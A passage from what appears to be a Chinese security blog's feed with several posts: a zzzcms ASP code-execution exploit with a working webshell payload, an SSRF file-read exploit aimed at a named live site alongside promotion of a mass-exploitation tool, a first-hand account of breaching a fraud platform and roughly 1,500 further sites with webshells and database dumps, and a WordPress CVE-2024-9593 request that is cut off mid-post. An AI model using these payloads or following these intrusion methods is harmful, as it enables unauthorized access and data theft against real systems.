&quot;&amp;getSubStrByFromAndEnd(ElseIfSubArray(0),&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;)&amp;&quot; then ReStr&#x3D;getSubStrByFromAndEnd(ElseIfSubArray(0),&quot;&quot;&#125;&quot;&quot;,&quot;&quot;&quot;&quot;,&quot;&quot;start&quot;&quot;):elseIfFlag&#x3D;true&quot;)                Zcontent&#x3D;replace(Zcontent,mif.value,ReStr)            else                if instr(strThen,&quot;&#123;else&quot;&amp;str&amp;&quot;&#125;&quot;)&gt;0 then                    strThen1&#x3D;split(strThen,iflabel3)(0)                    strElse1&#x3D;split(strThen,iflabel3)(1)                                        Execute(&quot;if &quot;&amp;strIf&amp;&quot; then ifFlag&#x3D;true else ifFlag&#x3D;false&quot;)                    if err then die &quot;判断标签有误请修正&lt;br&gt;&quot;&amp;strIf&amp;err.number&amp;err.description                    if ifFlag then Zcontent&#x3D;replace(Zcontent,mif.value,strThen1) else Zcontent&#x3D;replace(Zcontent,mif.value,strElse1)                else                          &#39;response.write(&quot;---------------------&quot;&amp;vbcrlf)                      &#39; response.write(strIf&amp;vbcrlf)                           &#39; response.write(&quot;---------------------&quot;&amp;vbcrlf)                                            Execute(&quot;if &quot;&amp;strIf&amp;&quot; then ifFlag&#x3D;true else ifFlag&#x3D;false&quot;)  &#x2F;&#x2F;漏洞点                    &#39;Execute(strIf)                    &#39;exit function                    if err then die &quot;判断标签有误请修正&lt;br&gt;&quot;&amp;strIf&amp;err.number&amp;err.description                    if ifFlag then Zcontent&#x3D;replace(Zcontent,mif.value,strThen) else Zcontent&#x3D;replace(Zcontent,mif.value,&quot;&quot;)                end if            end if            elseIfFlag&#x3D;false        next        set matchesIf&#x3D;nothing                    if ifStrin(Zcontent,&quot;&#123;if1:&quot;) then parseIf(&quot;1&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if2:&quot;) then parseIf(&quot;2&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if3:&quot;) then parseIf(&quot;3&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if4:&quot;) then parseIf(&quot;4&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if5:&quot;) then parseIf(&quot;5&quot;) else Exit Function            End Function</code></pre><p>C:\inetpub\wwwroot\inc\zzz_mian.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&#39;获得表单    public function getForm( byval element,byval getType)  &#x2F;&#x2F;过滤post请求参数 这个可以绕过        on error resume next        getType&#x3D;lcase(getType)        dim s,e        select case getType            case &quot;get&quot;,&quot;both&quot;                if isRewrite and URLQueryString&lt;&gt;&quot;&quot; then                    aArray &#x3D; split(URLQueryString,&quot;&amp;&quot;)                    element &#x3D; lcase(element)                    for iI &#x3D; 0 To ubound(aArray)                        i &#x3D; instr(aArray(iI),&quot;&#x3D;&quot;)                        if i &gt; 0 then                            e &#x3D; lcase(left(aArray(iI),i-1))                            if element &#x3D; e then s &#x3D; mid(aArray(iI),i+1)                        end if                    next                end if                if s&#x3D;&quot;&quot; then s &#x3D; request.queryString(element)                if getType&#x3D;&quot;both&quot; and s&#x3D;&quot;&quot; then s &#x3D; request.form(element)            case &quot;post&quot;                s &#x3D; request.form(element)        end select        &#39;如果参数里面有下面这个字符那么直接报错  大写绕过        if ifstrin(s,&quot;execute&quot;) or ifstrin(s,&quot;request&quot;) or ifstrin(s,&quot;eval&quot;)  or ifstrin(s,&quot;script&quot;) or ifstrin(s,&quot;爠煥敵瑳&quot;) or ifstrin(s,&quot;┠&quot;)  or ifstrin(s,&quot;┼&quot;) then            getForm&#x3D;&quot;&quot;            errlog filterPara(s),&quot;&quot;            if evalsendmail&#x3D;1 then sendmail Receive_email,zset.siteTitle&amp;&quot;网站有人试图注入,IP&quot;&amp;getip(),&quot;网址:&quot;&amp;zset.siteUrl&amp;&quot;&lt;&#x2F;br&gt;项目：留言信息&lt;&#x2F;br&gt;表单：&quot;&amp;element&amp;&quot;&lt;&#x2F;br&gt;类型：&quot;&amp;getType&amp;&quot;&lt;&#x2F;br&gt;语句：&quot;&amp;s            goto404 &quot;请不要尝试注入，您的ip已记录&quot;        else            getForm &#x3D; enhtml(trim(s))        end if        if err.number&lt;&gt;0 then err.clear    end functionfunction enhtml(byval strs)     &#39;过滤脚本 可以绕过        reg.pattern &#x3D;&quot;&lt;script.+?&#x2F;script&gt;&quot;        strs&#x3D;reg.replace(strs,&quot;&quot;)        reg.pattern &#x3D;&quot;&lt;iframe.+?&#x2F;iframe&gt;&quot;        strs&#x3D;reg.replace(strs,&quot;&quot;)        strs &#x3D; Replace(strs,&quot;%&quot;,&quot;&amp;#037;&quot;)    &#39;strs&#x3D;replace(strs,&quot;&amp;&quot;,&quot;&amp;&quot;)        strs&#x3D;replace(strs,&quot;&#39;&quot;,&quot;&#39;&quot;)        strs&#x3D;replace(strs,&quot;&quot;&quot;&quot;,&quot;&amp;#34;&quot;)    &#39;strs&#x3D;replace(strs,&quot;&lt;&quot;,&quot;&lt;&quot;)    &#39;strs&#x3D;replace(strs,&quot;&gt;&quot;,&quot;&gt;&quot;)        reg.pattern&#x3D;&quot;(w)(here)&quot;        strs&#x3D;reg.replace(strs,&quot;$1h&amp;#101;re&quot;)        reg.pattern&#x3D;&quot;(s)(elect)&quot;        strs&#x3D;reg.replace(strs,&quot;$1el&amp;#101;ct&quot;)        reg.pattern&#x3D;&quot;(i)(nsert)&quot;        strs&#x3D;reg.replace(strs,&quot;$1ns&amp;#101;rt&quot;)        reg.pattern&#x3D;&quot;(e)(xecute)&quot;        strs&#x3D;reg.replace(strs,&quot;$exe&amp;#101;ute&quot;)                reg.pattern&#x3D;&quot;(r)(equest)&quot;        strs&#x3D;reg.replace(strs,&quot;$r&amp;#101;epuest&quot;)                reg.pattern&#x3D;&quot;(c)(reate)&quot;        strs&#x3D;reg.replace(strs,&quot;$1r&amp;#101;ate&quot;)                reg.pattern&#x3D;&quot;(d)(rop)&quot;        strs&#x3D;reg.replace(strs,&quot;$1ro&amp;#112;&quot;)        reg.pattern&#x3D;&quot;(a)(lter)&quot;        strs&#x3D;reg.replace(strs,&quot;$1lt&amp;#101;r&quot;)        reg.pattern&#x3D;&quot;(d)(elete)&quot;        strs&#x3D;reg.replace(strs,&quot;$1el&amp;#101;te&quot;)        reg.pattern&#x3D;&quot;(u)(pdate)&quot;        strs&#x3D;reg.replace(strs,&quot;$1p&amp;#100;ate&quot;)        reg.pattern&#x3D;&quot;(\s)(or)&quot;        strs&#x3D;reg.replace(strs,&quot;$1o&amp;#114;&quot;)        reg.pattern&#x3D;&quot;(java)(script)&quot;        strs&#x3D;reg.replace(strs,&quot;$1scri&amp;#112;t&quot;)        reg.pattern&#x3D;&quot;(j)(script)&quot;        strs&#x3D;reg.replace(strs,&quot;$1scri&amp;#112;t&quot;)        reg.pattern&#x3D;&quot;(vb)(script)&quot;        strs&#x3D;reg.replace(strs,&quot;$1scri&amp;#112;t&quot;)                if instr(strs,&quot;expression&quot;)&lt;&gt;0 then            strs&#x3D;replace(strs,&quot;expression&quot;,&quot;e&amp;#173;xpression&quot;,1,-1,0)        end if        enhtml&#x3D;strs    end function</code></pre><p>存在漏洞的点为:<br>    Execute(“if “&amp;strIf&amp;” then ifFlag&#x3D;true else ifFlag&#x3D;false”)</p><pre class="language-asp" data-language="asp"><code class="language-asp">exp:   蚁剑直接连接zzzcms 1.5.6 asp EXPPOST &#x2F;search&#x2F;index.asp HTTP&#x2F;1.1Host: www.fuckcms.comContent-Length: 159Cache-Control: max-age&#x3D;0Origin: http:&#x2F;&#x2F;www.fuckcms.comUpgrade-Insecure-Requests: 1DNT: 1Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;72.0.3626.81 Safari&#x2F;537.36 SE 2.X MetaSr 1.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8Referer: http:&#x2F;&#x2F;www.fuckcms.com&#x2F;search&#x2F;Accept-Language: zh-CN,zh;q&#x3D;0.9Cookie: zzz847_usercheck&#x3D;0; zzz847_keys&#x3D;sdasfsdf; ASPSESSIONIDQQACCRSD&#x3D;NOPNDKFAENGFMJJFGPOKKHIG; ASPSESSIONIDSSAABRTC&#x3D;JNBLPMFANFHIGFALOMABOGEO; ASPXSpy&#x3D;; ASPSESSIONIDQQBADRSC&#x3D;DMOFDLGAMMPMACNNOIPJICJC; zzz%5F&#x3D;errval&#x3D;%3Ca+href%3D%27http%3A%2F%2Fzzzcms%2Ecom%2Fnews%2F%3Fbits32%2Ehtml%27+target%3D%27%5Fblank%27%3E1%2E%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%90%AF%E7%94%A832%E4%BD%8D%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E3%80%82%3C%2Fa%3E%3Cbr%3E%3Ca+href%3D%27http%3A%2F%2Fzzzcms%2Ecom%2Fnews%2F%3Ffolderaccess%2Ehtml%27+target%3D%27%5Fblank%27%3E2%2E%E6%A3%80%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E3%80%82%3C%2Fa%3E&amp;cookiekeys&#x3D;xxxxxxx%7C%2Cxxxx%7C%2Ccccc%7C%2C111%7C&amp;oldpath&#x3D;8Lk9Sk6Mc%2F&amp;errdesc&#x3D;&amp;question&#x3D;test&amp;siteurl&#x3D;http%3A%2F%2Fwww%2Efuckcms%2Ecom%2F&amp;errtitle&#x3D;%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5&amp;password&#x3D;49ba59abbe56e057&amp;dbdata&#x3D;1&amp;username&#x3D;admin&amp;dbtype&#x3D;0&amp;searchkeys&#x3D;xxxxxxx&amp;errid&#x3D;0&amp;answer&#x3D;test&amp;sitename&#x3D;testConnection: closekeys&#x3D;&#123;if:EVAL(EVAL(chr(114)%2bchr(101)%2bchr(113)%2bchr(117)%2bchr(101)%2bchr(115)%2bchr(116))(chr(97)))&#125;&#123;end if&#125;&amp;a&#x3D;response.write(chr(98)%2bchr(98)%2bchr(99))</code></pre><p>执行截图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261704086.png" alt="漏洞执行截图"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>代码审计要全方位多语言审计才能发现别人发现不了的或者不会的东东。今天就到这里吧。这里主要是展示漏洞执行流程和绕过防护进行代码执行。</p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用我们的软件编写ssrf漏洞实战案例</title>
      <link href="/securitytools/2024/11/articles/2a9c16adbff1ef3f/"/>
      <url>/securitytools/2024/11/articles/2a9c16adbff1ef3f/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们在实战的时候遇到任意文件读取或者是ssrf漏洞来说任意文件读取漏洞那个如果有回显可以直接根据回显发送post get包就行了。如果没有回显那么我们如何编写这种漏洞的exp。例如:如下漏洞<br><a href="https://mp.weixin.qq.com/s/Cr1XIUkge36cGYtpHtw1Dw">https://mp.weixin.qq.com/s/Cr1XIUkge36cGYtpHtw1Dw</a><br>漏洞exp:</p><pre class="language-sh" data-language="sh"><code class="language-sh">GET &#x2F;api&#x2F;wxapps&#x2F;_requestPost?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&amp;data&#x3D;1 HTTP&#x2F;2Host: 127.0.0.1Sec-Ch-Ua: &quot;(Not(A:Brand&quot;;v&#x3D;&quot;8&quot;, &quot;Chromium&quot;;v&#x3D;&quot;101&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;101.0.4951.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close</code></pre><p>使用内置 curl_exec函数发送请求。漏洞原理</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//不带报头的curl</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_requestPost</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$ssl</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//curl完成</span>    <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//设置curl选项</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//URL</span>    <span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 FirePHP/0.7.4'</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_USERAGENT</span><span class="token punctuation">,</span> <span class="token variable">$user_agent</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//user_agent，请求代理信息</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_AUTOREFERER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//referer头，请求来源</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置超时时间</span>    <span class="token comment">//SSL相关</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ssl</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//禁用后cURL将终止从服务端进行验证</span>      <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检查服务器SSL证书中是否存在一个公用名(common name)。</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 处理post相关选项</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 是否为POST请求</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 处理请求数据</span>    <span class="token comment">// 处理响应结果</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//是否处理响应头</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//curl_exec()是否返回响应结果</span>    <span class="token comment">// 发出请求</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">,</span> <span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$response</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>我们随便找个网站看看exp就是<a href="https://5319.newadco.com//api/wxapps/_requestPost?url=http://dnslog%E5%9C%B0%E5%9D%80/&amp;data=">https://5319.newadco.com//api/wxapps/_requestPost?url=http://dnslog地址/&amp;data=</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261421596.png" alt="实战"><br>是不是可以这么理解。那我们编写的时候直接这么编写不就行了。我们看nuclei ssrf编写案例<br><a href="https://mp.weixin.qq.com/s/Z4IFUVFjhWHYtAUCxz50LQ">https://mp.weixin.qq.com/s/Z4IFUVFjhWHYtAUCxz50LQ</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261426697.png" alt="ssrf编写"><br>如果我们利用python或者自己写一个程序来实现ssrf那将会是很麻烦所以我们来介绍我们工具编写ssrf步骤。</p><h2 id="工具编写ssrf漏洞代码展示"><a href="#工具编写ssrf漏洞代码展示" class="headerlink" title="工具编写ssrf漏洞代码展示"></a>工具编写ssrf漏洞代码展示</h2><p>使用我们的工具编写ssrf漏洞只需简单的按规则发送请求即可。注意:<br>其中<a href="http://www.dnslog.cn/">www.dnslog.cn</a> 只能国内ip使用。<br/>这个只能国外地址使用 <a href="https://dnslog.org/">https://dnslog.org</a><br/><br><a href="https://oast.pro/">https://oast.pro/</a> 这个国内外ip都可以使用也就是nuclei使用的</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261435940.png" alt="编写实例"><br>如果返回的是vul exist!!! 那么就存在漏洞并且结果exp已经写出来了。<br>怎么样我们使用三个dns平台测试ssrf漏洞当然实战建议选择后面两个因为dnslog只能国内ip使用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在觉得编写exp poc很难么。还觉得难的话那是没有遇到我们的软件。后续源码小范围分享的时候会在内部辅导教学编写exp。直到学会为止。前提是你得会渗透测试能看懂http报文。和会简单的编程最好是C#编写。在这个waf 满天飞的时代我们必须有一个属于自己的exp poc武器。我们的武器现在可以最少支持100万网站的所有模块的批量。目前在测试框架1000w url的批量。相信市面上很少有工具可以达到这个程度。等测试完毕在发布测试文章。总之就是会发送get post这些请求包就行了。至于上传这个比较难。回头单独讲解吧。这个就写这么多吧。这个属于直达心脏比较危险你们懂得不适合大范围分享。因为我们的软件可以抗百万url。今天就讲到这里吧。</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
            <tag> original </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某诈骗平台渗透测试到代码审计前台getshell历程</title>
      <link href="/penetrationtest/2024/11/articles/cbd79839949e8ffc/"/>
      <url>/penetrationtest/2024/11/articles/cbd79839949e8ffc/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在某天刷某音的时候看到一个视频某音大黑客在展示。他打击某诈骗app的过程<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251559583.png" alt="起因"><br>然后我翻评论翻到底下有人说自己被诈骗了说在某个平台体现被拒绝了。并且他把这个截图带网址发到评论区了估计是想让抖音大黑阔帮忙看看能不能找回。如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251604302.png" alt="被骗人截图"><br>于是乎我抱着试一试的心态开始干了。</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>由于是ip地址我在fofa 这些平台查询了一下同ip不同端口的情况显示就开放网站另外此有防火墙使用端口扫描工具开放端口扫描不到。只能从网站直接入手了。发现该系统是thinkphp 。有的大佬说沃日直接上rce 确实是有的使用的是thinkphp 5.0.23以下的也写上5.0.24但是这个真的是5.0.24<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251611763.png" alt="网站特征"><br>我们浏览了一波网站注册用户什么的没有发现明显的漏洞另外后台也找不到。这是忽然想起一波日志是不是可以看看。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251615062.png" alt="日志"><br>一看这种日志也没有发现什么价值。看了几个小时正当放弃的时候。正好这时候管理员上线了并且这个记录管理员账号密码。所以顺利拿到了管理员账号密码进去后台。并且日志里面也有后台地址。如果不翻不等那么估计也不会发现日志里面存在管理员账号。所以运气成分比较大<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251618121.png" alt="日志获取账号密码"><br>使用账号密码成功登录后台<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251620902.png" alt="成功登录后台"><br>找到后台当然是getshell。什么最快当然是上传这个诈骗平台没有使用waf直接上传getshell。开始使用冰蝎免杀shell。由于有disable_functioin所以上哥斯拉了。使用哥斯拉bypass diable_function成功执行命令<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251624686.png" alt="执行命令"><br>打包源代码</p><h2 id="代码审计发现0day漏洞"><a href="#代码审计发现0day漏洞" class="headerlink" title="代码审计发现0day漏洞"></a>代码审计发现0day漏洞</h2><p>我们打包代码以后使用adminer 脱裤以后在本地搭建网站对其进行代码审计。对了使用adminer 脱裤的最好使用phpmyadmin导入数据库.sql文件。这样不会报错。注意在脱裤的时候要知道数据库字符集编码和排序规则编码。这样才可以在本地搭建成功。在代码审计发现ssrf 漏洞可以直接读取任意文件。当然还有其他漏洞比如 反序列化。文件上传。文件上传配合反序列化漏洞可以直接拿shell。关于代码的我已经在频道发布了。没有加数据库那套系统是旧版本同样存在漏洞。自己审计吧。回头有空把这些集成到工具里面。另外在搞完这个站的时候。又有骚扰短信发过来了。运气好把这个骚扰短信的站点也给日了。这个涉及范围比较广用1500多个站点暂时就不发布文章了那个也是代码审计审计出来的0day漏洞直接进后台配合模板直接getshell。放到图吧。回头这些详细过程小范围分享一下。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251630255.png" alt="ssrf"><br>广告站点<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251639460.png" alt="广告站"></p><h2 id="代码审计渗透测试总结"><a href="#代码审计渗透测试总结" class="headerlink" title="代码审计渗透测试总结"></a>代码审计渗透测试总结</h2><p>(1)如何学习php代码审计:需要具备 php基础知识 需要会写简单的网站后台 需要知道thinkphp知识。需要会渗透测试。需要有php代码审计功底。具备这些你就可以挖了。这些是基础条件至于能不能挖到取决于代码安全程度和自己的功底。两者缺一不可。我们在频道群里面已经说了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251644971.png" alt="代码审计学习"><br>其他审计也是一样的。另外看一下mcv开发东东都是相通的再看看类继承,接口等等东西这在代码审计里面用的很多.<br>软件辅助渗透测试:<br>(2)软件大批量跑还是可以的这个站估计直接搞不太好搞得扫描😂。。。。还是得url多。然后exp多才可以啊。缺一不可啊这两个😏。搞出来脱裤，然后代码审计批量。不是tp站也不是知名漏洞是通过组件漏洞getshell得😂。在这个waf满天飞得时代不要一直依赖工具。工具只是辅助还是得靠自身。我审计的那个源码利用难度比较低但是有条件才能利用成功。这个漏洞只能打9分不理想。。。。通杀是通杀但通杀的不多。几千个网站后台想想就牛逼啊。这玩意是基于原始代码重新研发的我只有原始代码没有变形的代码这就难搞了。需要大多数通杀得搞到变形的代码在看看能不能配合利用。这也能成为所以得apt但是不是那种😂。后台倒是漏洞多没啥用。这混cve cvnd可以。实战不行。要搞还得是前台或者无视后台利用那才牛逼。前段时间搞得那个诈骗网站只要是默认代码都通杀。那个用的不多。那个也打9分吧不太满意。有个.net 得day的站那个是需要注册用户才能getshell。这种漏洞也就8分吧。不太满意。至于那种简单的上传，注入前台的没啥技术含量。是人都可以审计表面10分但是实际上也就值5分。。最后总结:这年头学技术不管是搞站单枪匹马不行还是，团队合作然后做代码审计搞内网可持续攻击。攻击供应商的站能打一批那绝对手握多少0day😂😏。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411251647635.png" alt="配合软件拿下旁站获取目标源码"><br>就说这些下课吧。</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>窥探wordpress CVE-2024-9593所谓代码执行漏洞的秘密</title>
      <link href="/penetrationtest/2024/11/articles/34f1892bb33c988c/"/>
      <url>/penetrationtest/2024/11/articles/34f1892bb33c988c/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在浏览某些网站的网站的时候发现WordPress存在代码执行漏洞。即为CVE-2024-9593 在github搜索中发现如下poc链接:<br><a href="https://github.com/RandomRobbieBF/CVE-2024-9593">https://github.com/RandomRobbieBF/CVE-2024-9593</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041557581.jpg" alt="poc"></p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>wp<span class="token operator">-</span>admin<span class="token operator">/</span>admin<span class="token operator">-</span>ajax<span class="token punctuation">.</span>php<span class="token operator">?</span>action<span class="token operator">=</span>etimeclockwp_load_function HTTP<span class="token operator">/</span><span class="token number">2</span><span class="token class-name">Host</span><span class="token operator">:</span> wpscan<span class="token operator">-</span>vulnerability<span class="token operator">-</span>test<span class="token operator">-</span>bench<span class="token punctuation">.</span>ddev<span class="token punctuation">.</span>site<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">58.0</span><span class="token number">.3029</span><span class="token number">.110</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.3</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">16</span>function<span class="token operator">=</span>phpinfo</code></pre><p>于是乎找一波网站实战网站是找到了但是getshell想了很多没有成果。那我们接下来研究一下漏洞原理这个到底是什么引发的这个漏洞。看看能不能从中得到启发。<br>互联网找到的实战站点。<br><img 